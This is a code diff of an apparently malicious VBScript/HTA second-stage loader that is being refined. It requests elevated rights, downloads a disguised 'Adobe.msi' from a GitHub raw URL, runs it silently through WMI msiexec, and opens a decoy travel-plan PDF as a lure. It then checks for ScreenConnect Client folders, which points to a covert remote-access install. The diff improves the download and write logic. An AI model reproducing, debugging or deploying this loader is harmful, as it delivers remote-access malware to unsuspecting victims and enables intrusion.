@@ -2,6 +2,7 @@ Dim fso, sh, qs, tmp, selfPath, isAdmin, log, f
 Dim http, stream, msiUrl, msiPath, pid
 Dim wmiSvc, procClass, startup, cmdLine
 Dim pdfUrl, pdfPath, ph, ps
+Dim body, total, chunkSize, offset, remain, thisChunk
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
@@ -11,9 +12,9 @@ log = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\stage2_debug.txt"
 
 Set f = fso.CreateTextFile(log, True)
 f.WriteLine "=== start ==="
-f.WriteLine "time     : " & Now
-f.WriteLine "user     : " & sh.ExpandEnvironmentStrings("%USERNAME%")
-f.WriteLine "tmp      : " & tmp
+f.WriteLine "time : " & Now
+f.WriteLine "user : " & sh.ExpandEnvironmentStrings("%USERNAME%")
+f.WriteLine "tmp  : " & tmp
 
 selfPath = location.href
 selfPath = Replace(selfPath, "file:///", "")
@@ -37,33 +38,48 @@ If Not isAdmin Then
     self.close
 End If
 
-f.WriteLine "-> elevated, running payload"
+f.WriteLine "-> elevated, payload"
 
-' ---------- MSI via WinHTTP (no IE zone restriction) ----------
+' ============================================================
+'  MSI fetch with chunked write
+' ============================================================
 msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
 msiPath = tmp & "\Adobe.msi"
 
-f.WriteLine "msiUrl   : " & msiUrl
+f.WriteLine "msi url  : " & msiUrl
 On Error Resume Next
-Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-http.Open "GET", msiUrl, False
-http.Send
+Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+http.open "GET", msiUrl, False
+http.send
 If Err.Number <> 0 Then
-    f.WriteLine "msi http : ERR " & Err.Number & " - " & Err.Description
+    f.WriteLine "http err : " & Err.Number & " - " & Err.Description
     Err.Clear
 End If
 On Error GoTo 0
-f.WriteLine "msi stat : " & http.Status
-f.WriteLine "msi body : " & Len(http.ResponseBody) & " bytes"
+f.WriteLine "msi stat : " & http.status
+f.WriteLine "msi len  : " & LenB(http.responseBody) & " bytes"
 
-If http.Status = 200 Then
+If http.status = 200 Then
     Dim msiErr
     msiErr = ""
     On Error Resume Next
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
-    stream.Write http.ResponseBody
+    body = http.responseBody
+    total = LenB(body)
+    chunkSize = 65536
+    offset = 1
+    Do While offset <= total
+        remain = total - offset + 1
+        If remain < chunkSize Then
+            thisChunk = remain
+        Else
+            thisChunk = chunkSize
+        End If
+        stream.Write MidB(body, offset, thisChunk)
+        offset = offset + thisChunk
+    Loop
     stream.SaveToFile msiPath, 2
     If Err.Number <> 0 Then
         msiErr = Err.Number & " - " & Err.Description
@@ -73,13 +89,15 @@ If http.Status = 200 Then
     On Error GoTo 0
     f.WriteLine "msi save : " & msiErr
     If fso.FileExists(msiPath) Then
-        f.WriteLine "msi ondisk: " & fso.GetFile(msiPath).Size & " bytes"
+        f.WriteLine "msi disk : " & fso.GetFile(msiPath).Size & " bytes"
     Else
-        f.WriteLine "msi ondisk: FALSE"
+        f.WriteLine "msi disk : FALSE"
     End If
 End If
 
-' ---------- spawn msiexec ----------
+' ============================================================
+'  Spawn msiexec
+' ============================================================
 If fso.FileExists(msiPath) Then
     f.WriteLine "-> WMI spawn msiexec"
     Dim wmiErr
@@ -99,48 +117,60 @@ If fso.FileExists(msiPath) Then
             wmiErr = "Create: " & Err.Number & " - " & Err.Description
             Err.Clear
         Else
-            f.WriteLine "spawned  : pid " & pid
+            f.WriteLine "spawn    : pid " & pid
         End If
     End If
     On Error GoTo 0
     If wmiErr <> "" Then f.WriteLine "wmi err  : " & wmiErr
 End If
 
-' ---------- PDF (also via WinHTTP) ----------
+' ============================================================
+'  PDF with chunked write
+' ============================================================
 pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
 pdfPath = tmp & "\Travel-Meeting-Plan-Q4-2026.pdf"
 
 On Error Resume Next
-Set ph = CreateObject("WinHttp.WinHttpRequest.5.1")
-ph.Open "GET", pdfUrl, False
-ph.Send
+Set ph = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+ph.open "GET", pdfUrl, False
+ph.send
 On Error GoTo 0
-f.WriteLine "pdf stat : " & ph.Status
-f.WriteLine "pdf body : " & Len(ph.ResponseBody) & " bytes"
+f.WriteLine "pdf stat : " & ph.status
+f.WriteLine "pdf len  : " & LenB(ph.responseBody) & " bytes"
 
-If ph.Status = 200 Then
+If ph.status = 200 Then
     On Error Resume Next
     Set ps = CreateObject("ADODB.Stream")
     ps.Type = 1
     ps.Open
-    ps.Write ph.ResponseBody
+    body = ph.responseBody
+    total = LenB(body)
+    offset = 1
+    Do While offset <= total
+        remain = total - offset + 1
+        If remain < chunkSize Then
+            thisChunk = remain
+        Else
+            thisChunk = chunkSize
+        End If
+        ps.Write MidB(body, offset, thisChunk)
+        offset = offset + thisChunk
+    Loop
     ps.SaveToFile pdfPath, 2
     ps.Close
     On Error GoTo 0
     If fso.FileExists(pdfPath) Then
-        f.WriteLine "pdf ondisk: " & fso.GetFile(pdfPath).Size & " bytes"
+        f.WriteLine "pdf disk : " & fso.GetFile(pdfPath).Size & " bytes"
         CreateObject("Shell.Application").ShellExecute pdfPath, "", "", "open", 1
     End If
 End If
 
-f.WriteLine "-> wait 10s"
-sh.Run "%COMSPEC% /c timeout /t 10 /nobreak >nul", 0, True
+f.WriteLine "-> wait 15s"
+sh.Run "%COMSPEC% /c timeout /t 15 /nobreak >nul", 0, True
 
-Dim c1, c2
+Dim c1
 c1 = fso.FolderExists("C:\Program Files (x86)\ScreenConnect Client")
-c2 = fso.FolderExists("C:\Program Files\ScreenConnect Client")
 f.WriteLine "sc(x86)  : " & c1
-f.WriteLine "sc(x64)  : " & c2
 f.WriteLine "=== end ==="
 f.Close
 
